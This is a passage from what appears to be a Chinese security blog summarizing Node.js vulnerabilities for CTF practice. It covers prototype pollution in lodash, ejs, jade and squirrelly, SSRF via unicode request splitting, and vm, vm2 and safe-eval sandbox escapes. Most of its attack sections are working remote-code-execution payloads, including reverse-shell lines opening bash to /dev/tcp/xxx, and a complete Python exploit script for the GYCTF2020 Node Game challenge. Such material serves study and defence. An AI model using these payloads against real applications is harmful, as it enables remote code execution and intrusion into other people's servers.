&#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)# merge() 函数用于合并两个数组内容到第一个数组。在本段代码的作用就是将待操作的对象merge到一个空对象中</code></pre><p>需要注意的点是：<br>在JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。<br>我们来看下，有和没有JSON解析的区别</p><pre><code class="javascript">&lt;script&gt;          let o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;        console.log(o2)      let object2=JSON.parse(&#39;&#123;&quot;a&quot;:1,&quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#39;)      console.log(object2)  &lt;/script&gt;</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668836886258-58f08cf3-4739-40b1-ade0-6f1a54f8dc7f.png" alt="image-20220416001143881.png"><br> 所以代码在执行过程中会存在这么一步  </p><pre><code class="javascript">target[__proto__]=source[__proto__]可理解为  object.prototype = &#123;&quot;b&quot;: 2&#125; 导致了原型链污染</code></pre><p> 最终输出的结果为：<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668839912381-24bdf37b-f5df-41ea-a963-e5c31549da5d.png" alt="image.png"><br> 可见object3的b是从原型中获取到的，说明Object已经被污染了。  </p><h2 id="lodash"><a href="#lodash" class="headerlink" title="lodash"></a>lodash</h2><blockquote><p> lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：  </p><ol><li>lodash.template 一个简单的模板引擎</li><li>lodash.merge 函数或对象的合并</li></ol><p> 其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p></blockquote><p>以<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">Code-Breaking 2018 Thejs</a>为例说明分析过程:<br> 题目源码下载：<a href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p><pre><code class="javascript">const fs = require(&#39;fs&#39;)const express = require(&#39;express&#39;)const bodyParser = require(&#39;body-parser&#39;)const lodash = require(&#39;lodash&#39;)const session = require(&#39;express-session&#39;)const randomize = require(&#39;randomatic&#39;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;/static&#39;, express.static(&#39;static&#39;))app.use(session(&#123;    name: &#39;thejs.session&#39;,    secret: randomize(&#39;aA0&#39;, 16),    resave: false,    saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)app.set(&#39;views&#39;, &#39;./views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;/&#39;, (req, res) =&gt; &#123;    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#39;POST&#39;) &#123;        data = lodash.merge(data, req.body)        req.session.data = data    &#125;        res.render(&#39;index&#39;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))</code></pre><p> 问题出在lodash.merge()函数,这个函数存在原型链污染漏洞。我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840471628-b5711487-8536-4a31-b5b4-c779de7628db.png" alt="image-20220416004841823.png"><br> 页面最终会通过lodash.template进行渲染<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840499521-d6d64285-7a69-4e69-b6fb-a8221e5ff74f.png" alt="image-20220416005502144.png"><br> 跟踪到lodash/template.js中<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840571097-a32cb4ca-8bf1-44a2-b1ff-940d5d715282.png" alt="QyN5JVOde3YL8aZ.png"><br>如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。<br>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840627165-a79efcc5-3819-4e3f-8a7d-a2accd1ef055.png" alt="pwoVFrOyfzJX42M.png"><br>通过构造chile_process.exec()就可以执行任意代码了。<br>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)//&quot;&#125;&#125;</code></pre><p>(这里直接用require会报错：ReferenceError: require is not defined<br>p神给了一个更好的payload：</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;</code></pre><h2 id="ejs"><a href="#ejs" class="headerlink" title="ejs"></a>ejs</h2><blockquote><p>主要为两个函数的伪造。<br>opts.outputFunctionName<br>opts.escapeFunction</p></blockquote><p><strong>例一</strong><br> test.js  </p><pre><code class="javascript">var express = require(&#39;express&#39;);var _= require(&#39;lodash&#39;);var ejs = require(&#39;ejs&#39;);var app = express();//设置模板的位置app.set(&#39;views&#39;, __dirname);//对原型进行污染var malicious_payload = &#39;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;&#39;;_.merge(&#123;&#125;, JSON.parse(malicious_payload));//进行渲染app.get(&#39;/&#39;, function (req, res) &#123;    res.render (&quot;./test.ejs&quot;,&#123;        message: &#39;lufei test &#39;    &#125;);&#125;);//设置httpvar server = app.listen(8081, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)&#125;);</code></pre><p> test.ejs  </p><pre><code class="javascript">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;&lt;%= message%&gt;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p> payload：  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></pre><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;</code></pre><p><strong>例二</strong></p><pre><code class="javascript">router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;  res.type(&#39;html&#39;);  var user = new function()&#123;    this.userinfo = new function()&#123;    this.isVIP = false;    this.isAdmin = false;        &#125;;  &#125;;  utils.copy(user.userinfo,req.body);  if(user.userinfo.isAdmin)&#123;    return res.json(&#123;ret_code: 0, ret_msg: &#39;login success!&#39;&#125;);    &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#39;login fail!&#39;&#125;);    &#125;&#125;);</code></pre><p>**<em>payload1</em>**：覆盖 opts.outputFunctionName , 这样构造的payload就会被拼接进js语句中，并在 ejs 渲染时进行 RCE。  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); //&quot;&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); __tmp2&quot;&#125;&#125;&#125;</code></pre><p>**<em>payload2</em>**：伪造 opts.escapeFunction 也可以进行 RCE  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);&quot;&#125;&#125;&#125;</code></pre><p><strong>补充:</strong> 在 ejs 模板中还有三个可控的参数, 分别为 opts.localsName 和 opts.destructuredLocals 和 opts.filename, 但是这三个无法构建出合适的污染链。  </p><h2 id="jade"><a href="#jade" class="headerlink" title="jade"></a>jade</h2><p>compileDebug的伪造<br>给出上面题目的payload，可参考着看。</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;console.log(global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/1234 0&gt;&amp;1\&quot;&#39;))&quot;&#125;&#125;</code></pre><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);//&quot;&#125;&#125;&#125;</code></pre><h2 id="squirrelly"><a href="#squirrelly" class="headerlink" title="squirrelly"></a>squirrelly</h2><p><strong><em>CVE-2021-32819</em></strong><br>server.js</p><pre><code class="javascript">const express = require(&#39;express&#39;)const squirrelly = require(&#39;squirrelly&#39;)const app = express()app.set(&#39;views&#39;, __dirname);app.set(&#39;view engine&#39;, &#39;squirrelly&#39;)app.use(express.urlencoded(&#123; extended: false &#125;));app.get(&#39;/&#39;, (req, res) =&gt; &#123;   res.render(&#39;index.squirrelly&#39;, req.query)&#125;)var server = app.listen(3000, &#39;0.0.0.0&#39;, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;Listening on http://%s:%s&quot;, host, port)&#125;);</code></pre><p> index.squirrelly  </p><pre><code class="javascript">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;CVE-2021-32819&lt;/title&gt;        &lt;h1&gt;Test For CVE-2021-32819&lt;/h1&gt;    &lt;/head&gt;&lt;body&gt;    &lt;h1&gt;&#123;&#123;it.variable&#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p> payload  </p><pre><code class="javascript">/?defaultFilter=e&#39;)); let require = global.require || global.process.mainModule.constructor._load; require(&#39;child_process&#39;).exec(&#39;dir&#39;); //</code></pre><p>PS:以下贴出几篇文章，师傅们可以跟进分析：<br><a href="https://www.aisoutu.com/a/1373814">https://www.aisoutu.com/a/1373814</a><br><a href="https://cloud.tencent.com/developer/article/2035888">https://cloud.tencent.com/developer/article/2035888</a><br><a href="https://www.freebuf.com/vuls/276112.html">https://www.freebuf.com/vuls/276112.html</a><br><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析</a></p><h1 id="nodejs中的ssrf"><a href="#nodejs中的ssrf" class="headerlink" title="nodejs中的ssrf"></a>nodejs中的ssrf</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>**虽然用户发出的http请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符。相反，这些字符被截断为其JavaScript表示的最低字节  **</p><pre><code class="plsql">&gt; v = &quot;/caf\u&#123;E9&#125;\u&#123;01F436&#125;&quot;&#39;/café🐶&#39;&gt; Buffer.from(v,&#39;latin1&#39;).toString(&#39;latin1&#39;)&#39;/café=6&#39;</code></pre><p><strong>Crlf HTTP头注入:</strong><br> 假设一个服务器，接受用户输入，并将其包含在通过HTTP公开的内部服务请求中，像这样：  </p><pre><code class="plsql">GET /private-api?q=&lt;user-input-here&gt; HTTP/1.1Authorization: server-secret-key</code></pre><p> 如果服务器未正确验证用户输入，则攻击者可能会直接注入协议控制字符到请求里。假设在这种情况下服务器接受了以下用户输入：  </p><pre><code class="plsql">&quot;x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n&quot;</code></pre><p> 在发出请求时，服务器可能会直接将其写入路径，如下：  </p><pre><code class="plsql">GET /private-api?q=x HTTP/1.1DELETE /private-apiAuthorization: server-secret-key</code></pre><p><strong>说到底就是\r\n成功生效</strong><br>接收服务将此解释为两个单独的HTTP请求，一个GET后跟一个DELETE<br>好的HTTP库通通常包含阻止这一行为的措施，Node.js也不例外：如果你尝试发出一个路径中含有控制字符的HTTP请求，它们会被URL编码：</p><pre><code class="plsql">http.get(&#39;http://example.com/\r\n/test&#39;).output[ &#39;GET /%0D%0A/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p> 不幸的是，上述的处理unicode字符错误意味着可以规避这些措施。考虑如下的URL，其中包含一些带变音符号的unicode字符：  </p><pre><code class="plsql">&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;http://example.com/čĊ/test</code></pre><p> 当Node.js版本8或更低版本对此URL发出GET请求时，它不会进行转义，因为它们不是HTTP控制字符：  </p><pre><code class="plsql">http.get(&#39;http://example.com/\u010D\u010A/test&#39;).output[ &#39;GET /čĊ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p> 但是当结果字符串被编码为latin1写入路径时，这些字符将分别被截断为“\r”和“\n”：  </p><pre><code class="plsql">Buffer.from(&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;, &#39;latin1&#39;).toString()&#39;http://example.com/\r\n/test&#39;</code></pre><p>Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符<br>说白了，上面这段的意思就是我们可以利用一些特殊字符，它们在URL请求时不会被转义处理，但是当它到了js引擎时，由于其默认用的是latin1，因此可以将我们用的特殊字符转义得到我们需要的字符，从而达到ssrf的目的</p><h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p><strong>source：</strong></p><pre><code class="plsql">var express = require(&#39;express&#39;); var app = express(); var fs = require(&#39;fs&#39;); var path = require(&#39;path&#39;); // 处理文件路径 var http = require(&#39;http&#39;); var pug = require(`pug`); // 模板渲染 var morgan = require(&#39;morgan&#39;); // 日志 const multer = require(&#39;multer&#39;); // 用于处理multipart/form-data类型的表单数据，实现上传功能// 将上传的文件存储在./dist[自动创建]返回一个名为file的文件数组 app.use(multer(&#123;dest: &#39;./dist&#39;&#125;).array(&#39;file&#39;)); // 使用简化版日志 app.use(morgan(&#39;short&#39;));  // 静态文件路由 app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#39;/uploads&#39;))) app.use(&quot;/template&quot;, express.static(path.join(__dirname, &#39;/template&#39;)))  app.get(&#39;/&#39;, function (req, res) &#123;      // GET方法获取action参数      var action = req.query.action ? req.query.action : &quot;index&quot;;      // action中不能包含/ &amp; \      if (action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;)) &#123;            res.send(&quot;Errrrr, You have been Blocked&quot;);      &#125;        // 将/template/[action].pug渲染成html输出到根目录      file = path.join(__dirname + &#39;/template/&#39; + action + &#39;.pug&#39;);      var html = pug.renderFile(file);      res.send(html); &#125;);  app.post(&#39;/file_upload&#39;, function (req, res) &#123;      var ip = req.connection.remoteAddress; // remoteAddress无法伪造，因为TCP有三次握手，伪造源IP会导致无法完成TCP连接      var obj = &#123;msg: &#39;&#39;,&#125;      // 请求必须来自localhost      if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;            obj.msg = &quot;only admin&#39;s ip can use it&quot;            res.send(JSON.stringify(obj));            return      &#125;      fs.readFile(req.files[0].path, function (err, data) &#123;            if (err) &#123;                  obj.msg = &#39;upload failed&#39;;                  res.send(JSON.stringify(obj));            &#125; else &#123;                  // 文件路径为/uploads/[mimetype]/filename，mimetype可以进行目录穿越实现将文件存储至/template并利用action渲染到界面                  var file_path = &#39;/uploads/&#39; + req.files[0].mimetype + &quot;/&quot;;                  var file_name = req.files[0].originalname                  var dir_file = __dirname + file_path + file_name                  if (!fs.existsSync(__dirname + file_path)) &#123;                        try &#123;                              fs.mkdirSync(__dirname + file_path)                        &#125; catch (error) &#123;                              obj.msg = &quot;file type error&quot;;                              res.send(JSON.stringify(obj));                              return                        &#125;                  &#125;                  try &#123;                        fs.writeFileSync(dir_file, data)                        obj = &#123;msg: &#39;upload success&#39;, filename: file_path + file_name&#125;                  &#125; catch (error) &#123;                        obj.msg = &#39;upload failed&#39;;                  &#125;                  res.send(JSON.stringify(obj));            &#125;      &#125;) &#125;)  // 查看题目源码 app.get(&#39;/source&#39;, function (req, res) &#123;      res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;)); &#125;);  app.get(&#39;/core&#39;, function (req, res) &#123;      var q = req.query.q;      var resp = &quot;&quot;;      if (q) &#123;            var url = &#39;http://localhost:8081/source?&#39; + q            console.log(url)               // 对url字符进行waf            var trigger = blacklist(url);            if (trigger === true) &#123;                  res.send(&quot;error occurs!&quot;);            &#125; else &#123;                  try &#123;                              // node对/source发出请求，此处可以利用字符破坏进行切分攻击访问/file_upload路由(❗️此请求发出者为localhost主机)，实现对remoteAddress的绕过                        http.get(url, function (resp) &#123;                              resp.setEncoding(&#39;utf8&#39;);                              resp.on(&#39;error&#39;, function (err) &#123;                                    if (err.code === &quot;ECONNRESET&quot;) &#123;                                          console.log(&quot;Timeout occurs&quot;);                                    &#125;                              &#125;);                                        // 返回结果输出到/core                              resp.on(&#39;data&#39;, function (chunk) &#123;                                    try &#123;                                          resps = chunk.toString();                                          res.send(resps);                                    &#125; catch (e) &#123;                                          res.send(e.message);                                    &#125;                              &#125;).on(&#39;error&#39;, (e) =&gt; &#123;                                    res.send(e.message);                              &#125;);                        &#125;);                  &#125; catch (error) &#123;                        console.log(error);                  &#125;            &#125;      &#125; else &#123;            res.send(&quot;search param &#39;q&#39; missing!&quot;);      &#125; &#125;)  // 关键字waf 利用字符串拼接实现绕过 function blacklist(url) &#123;      var evilwords = [&quot;global&quot;, &quot;process&quot;, &quot;mainModule&quot;, &quot;require&quot;, &quot;root&quot;, &quot;child_process&quot;, &quot;exec&quot;, &quot;\&quot;&quot;, &quot;&#39;&quot;, &quot;!&quot;];      var arrayLen = evilwords.length;       for (var i = 0; i &lt; arrayLen; i++) &#123;            const trigger = url.includes(evilwords[i]);            if (trigger === true) &#123;                  return true            &#125;      &#125; &#125;  var server = app.listen(8081, function () &#123;      var host = server.address().address      var port = server.address().port      console.log(&quot;Example app listening at http://%s:%s&quot;, host, port) &#125;)</code></pre><p><strong>exp:</strong></p><pre><code class="plsql">import requestspayload = &quot;&quot;&quot; HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: &#123;&#125;Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt&#123;&#125;&quot;&quot;&quot;.replace(&#39;\n&#39;, &#39;\r\n&#39;)body = &quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUtContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lmonstergg.pug&quot;Content-Type: ../template-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat /flag.txt&#39;).toString()&quot;)-return x------WebKitFormBoundarysAs7bV3fMHq0JXUt--&quot;&quot;&quot;.replace(&#39;\n&#39;, &#39;\r\n&#39;)payload = payload.format(len(body), body) \    .replace(&#39;+&#39;, &#39;\u012b&#39;)             \    .replace(&#39; &#39;, &#39;\u0120&#39;)             \    .replace(&#39;\r\n&#39;, &#39;\u010d\u010a&#39;)    \    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;)             \    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;)             \    .replace(&#39;[&#39;, &#39;\u015b&#39;)             \    .replace(&#39;]&#39;, &#39;\u015d&#39;) \    + &#39;GET&#39; + &#39;\u0120&#39; + &#39;/&#39;session = requests.Session()session.trust_env = Falseresponse1 = session.get(&#39;http://3d02a3de-3cbc-4f99-ab55-9fa306637282.node4.buuoj.cn:81/core?q=&#39; + payload)response = session.get(&#39;http://3d02a3de-3cbc-4f99-ab55-9fa306637282.node4.buuoj.cn:81/?action=lmonstergg&#39;)print(response.text)</code></pre><h1 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p><strong>context</strong><br> vm 模块创建一个V8虚拟引擎 context（上下文、环境）来编译和运行代码。  </p><pre><code class="plsql">context 是语境、环境、上下文的意思，类似于文章的语境，一句话的意思需要根据语境推断，即文章的上下文。以此类比，这里的 context 是 JavaScript 代码所处的环境（有点像作用域的概念），一条代码语句在不同的环境执行的结果也不同。</code></pre><p>调用代码与被调用代码处于不同的 context，意味着它们的 global 对象是不同的。<br>例子：</p><pre><code class="plsql">const vm = require(&#39;vm&#39;);// global下定义一个 x 变量const x = 1;// context也定义一个 x 变量const context = &#123; x: 2 &#125;;vm.createContext(context);          // 语境化 &#123;x:2&#125;// code包含的代码将在 context 下执行，所以其中所有代码访问的变量都是 context 下的const code = &#39;x += 40; var y = 17;&#39;;vm.runInContext(code, context);// context = &#123;x:42, y:17&#125;console.log(context.x); // 42console.log(context.y); // 17// global没有被改动console.log(x); // 1; y is not defined.</code></pre><p> code执行的环境是 context ，它访问的全局对象就是访问自定义的 context 对象。<br><strong>contextify 语境化</strong><br> 根据 V8 引擎的文档指明：  </p><pre><code class="plsql">在 V8 中，context 是一个执行环境，它允许在隔离的、无关联的一个 V8 实例中运行 JavaScript 应用。你必须为运行的任何JavaScript代码指定所应该处于的 context。</code></pre><p>vm.createContext() 有一个 contextobject 参数，用于接收一个对象（如果没有，就在模块内部创建一个），所谓语境化就是创建一个 context（对象） 然后传入 contextObject 作为代码执行环境的过程。  </p><h2 id="vm逃逸"><a href="#vm逃逸" class="headerlink" title="vm逃逸"></a>vm逃逸</h2><p>vm创建一个新的 context 执行 JavaScript 代码，不能访问 global 对象，看起来就像一个沙箱了。<br>例如我们想要访问 process：</p><pre><code class="plsql">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`process`);   // 默认 context = &#123;&#125;console.log(xyz);</code></pre><p>结果:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612046837-5f634418-9837-44b2-8968-28bd67220a43.png" alt="image.png"><br> 预料之中，因为 process 不存在于新的 context，它存在于原来的 context 中，而原来的 context 的 global 对象有 process 属性：  </p><pre><code class="plsql">&quot;use strict&quot;;console.log(process)</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612137486-e997e313-634b-40f6-92dc-5af7e767d1a5.png" alt="image.png"><br> 通过对象带有的 constructor 属性逃逸:</p><pre><code class="plsql">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`this.constructor.constructor(&#39;return process.env&#39;)()`);console.log(xyz);  // xyz的值为最后一句JavaScript代码执行的结果，这里是函数返回值</code></pre><p>结果:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612256209-e86817c0-1c5a-441b-91e3-69fb1f2f9b16.png" alt="image.png"><br>this引用的是当前所在的一个对象，这里是传入 contextObject 的对象，它在外部定义，所以它属于外部的 context。通过 .constructor 得到 Object Contrustor ，再通过 .constructor 得到 Function constructor，这是函数的构造函数，通过传入一个包含代码的字符串参数就能创建一个新的函数，最后的 () 就是调用这个函数。<br>获得 process 之后就能 RCE 了。</p><pre><code class="plsql">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ipconfig&#39;).toString()`);console.log(xyz);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612373997-17575d9f-dd72-4406-872f-4ce4841a9ce2.png" alt="image.png"></p><h2 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h2><p>nodejs.js 内置的 vm 模块提供的沙箱环境的隔离程度不高，因此最好不要执行不受信任的代码，这一点在node.js文档中明确指出。<br>vm2是一个第三方模块，基于vm模块、Proxy特性、require重写来实现，能提供隔离程度更高的沙箱。<br> vm的例子在vm2运行：  </p><pre><code class="plsql">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);new VM().run(&#39;this.constructor.constructor(&quot;return process&quot;)()&#39;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668613759546-ed42fac1-20b3-4915-adf8-5411de5170cd.png" alt="image.png"><br> 这次通过 this.constructor.constructor 也不能获取 process 了。这是由于 vm2 语境化了在 vm context 中的所有对象，.constructor指向的构造函数并不是外部的 context 。  </p><pre><code class="plsql">// vm&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`this.constructor.constructor`);console.log(xyz)                       // Function: Functionconsole.log(xyz === &#123;&#125;.constructor.constructor);       // true// vm2&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const xyz = new VM().run(&#39;this.constructor.constructor&#39;);console.log(xyz)                       // Function: Functionconsole.log(xyz === &#123;&#125;.constructor.constructor)        // false</code></pre><p><strong>vm2逃逸思路</strong><br>逃逸的思路：我们需要一些沙箱外的东西，它不在沙箱 context 的限制范围内，通过它就能再次访问 constructor 。<br>**1.异常处理机制 try catch 就能做到这一点，主进程在 try 抛出异常，然后在 catch 捕获 error 对象，通过这个 error 对象引用到 process **</p><pre><code>vm2 将该漏洞已修复</code></pre><pre><code class="plsql">const &#123;NodeVM&#125; = require(&#39;vm2&#39;); nvm = new NodeVM()nvm.run(`    try &#123;        this.process.removeListener();     &#125;     catch (host_exception) &#123;        console.log(&#39;host exception: &#39; + host_exception.toString());        // 通过 error 对象引用        host_constructor = host_exception.constructor.constructor;        host_process = host_constructor(&#39;return this&#39;)().process;    child_process = host_process.mainModule.require(&quot;child_process&quot;);    console.log(child_process.execSync(&quot;whoami&quot;).toString());    &#125;`);</code></pre><p> 结果：<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668614464966-61b06bd9-ccc9-432f-9bd1-670748257f0b.png" alt="668e27f4a4304458a6644938470fe5dc.png"><br>其他得一些payload</p><pre><code class="plsql">var handler = &#123;    get () &#123;     console.log(&quot;get&quot;);    &#125;  &#125;;var target = &#123;&#125;;var proxy = new Proxy(target, handler);Object.prototype.has = function(t, k)&#123;    console.log(&quot;has&quot;);&#125;proxy.a; //触发get&quot;&quot; in proxy; //触发has，这个has是在原型链上定义的w</code></pre><p>========================================</p><pre><code class="plsql">&quot;use strict&quot;;var process;Object.prototype.has = function (t, k) &#123;    process = t.constructor(&quot;return process&quot;)();&#125;;&quot;&quot; in Buffer.from;process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</code></pre><h2 id="safe-eval模块逃逸"><a href="#safe-eval模块逃逸" class="headerlink" title="safe-eval模块逃逸"></a>safe-eval模块逃逸</h2><p> safe-eval 第三方模块基于内置模块 vm 实现，可以用于执行 JavaScript 代码，默认能访问 V8 引擎的 JavaScript APIs，而不能访问 node.js 的 APIs，但通过传入 context 也能实现对它们的访问。  </p><pre><code class="plsql">safeEval(code, [context], [options])</code></pre><p> context 是一个包含属性和方法的对象，这些方法和属性从全局，所以要注意传入的属性和方法，否则会造成沙箱逃逸。<br> 在 version &lt;= 0.3.0 中，safe-eval 存在沙箱逃逸的漏洞：  </p><pre><code class="plsql">&gt;npm i safe-eval@0.3.0</code></pre><pre><code class="plsql">// test.jsconst safeEval = require(&#39;safe-eval&#39;)var code = `    this.constructor.constructor(&#39;return process&#39;)()`var 